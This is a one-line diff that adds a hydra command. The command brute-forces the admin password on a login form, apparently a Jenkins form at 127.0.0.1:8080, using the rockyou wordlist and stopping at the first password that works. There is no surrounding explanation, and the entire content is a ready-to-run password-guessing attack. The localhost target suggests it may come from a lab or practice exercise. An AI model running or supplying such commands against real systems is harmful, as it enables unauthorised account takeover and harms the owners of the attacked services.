@@ -1,0 +1,1 @@
+hydra -vV -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 -f http-form-post "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password"
